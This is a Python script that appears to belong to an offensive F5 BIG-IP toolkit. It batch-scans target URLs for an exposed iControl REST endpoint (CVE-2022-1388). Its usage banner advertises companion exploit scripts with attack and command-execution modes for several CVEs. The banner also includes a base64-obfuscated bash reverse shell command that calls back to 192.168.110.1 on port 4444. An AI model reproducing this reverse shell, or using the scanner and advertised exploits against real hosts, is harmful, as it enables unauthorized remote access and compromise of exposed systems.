import requests
import argparse

requests.packages.urllib3.disable_warnings()


def usage():
    print('''

  ____  U _____ u    _      ____    
 |  _"\ \| ___"|/U  /"\  u |  _"\   
/| | | | |  _|"   \/ _ \/ /| | | |  
U| |_| |\| |___   / ___ \ U| |_| |\ 
 |____/ u|_____| /_/   \_\ |____/ u 
  |||_   <<   >>  \\    >>  |||_    
 (__)_) (__) (__)(__)  (__)(__)_)   
     Modified by: HTTPS                                    


    +-----------------------------------------------------------------+
    -=2022/CVE-1388.py the CVE-2022-1388 REST Auth Bypass RCE basic usage is in github readme=-
    https://github.com/Holyshitbruh/20221-2021-F5-BIG-IP-IQ-RCE/blob/main/README.md  
    +-----------------------------------------------------------------+
    2022
    Vulnerability name: F5 BIG-IP iControl Rest API exposed Check
    Function: single detection, batch detection                                    
    Single detection: python exp.py -u url
    Batch detection: python exp.py -f url.txt
    Check: python check.py -f url.txt
    +-----------------------------------------------------------------+   
    2021
        Validation mode: python CVE_2021.py -v true -u target_url 
        Attack mode: python CVE_2021.py -a true -u target_url -c command 
        Batch detection: python CVE_2021.py -s true -f file
        Bounce mode: python CVE_2021.py -r true -u target_url -c command 
    +-----------------------------------------------------------------+
    CVE-2022-26133
         python3 CVE-26133.py -h
         usage: CVE-26133.py [-h] [-u URL] [--verify] [-c COMMAND] [-f FILE]
         optional arguments:
         -h, --help  show this help message and exit
         -u URL      input target url, eg: http://192.168.1.1:7990/
         --verify    verify mode, verify if target is vulnerable.
         -c COMMAND  exploit mode, eg: bash -c
              {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}
         -f FILE     verify targets in the file if vulnerable.   
    +-----------------------------------------------------------------+  
                                 
    ''')


def check(url):
    try:
        target_url = url + "/mgmt/shared/authn/login"
        res = requests.get(target_url, verify=False, timeout=3)
        if "resterrorresponse" in res.text:
            print(f"\033[0;31;22m[+] Host: {url} F5 iControl Rest API exposed \033[0m")
        else:
            print(f"\033[0;32;22m[-] Host: {url} F5 not vulnerability \033[0m")
    except Exception as e:
        print(f"\033[0;33;22m[x] Host: {url} Connection Fail \033[0m")


def run(filepath):
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        check(u)
    return check


def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="Please Poc.py -u host")
    parse.add_argument("-f", "--file", help="Please poc.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    if url is not None and filepath is None:
        check(url)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()


if __name__ == '__main__':
    main()
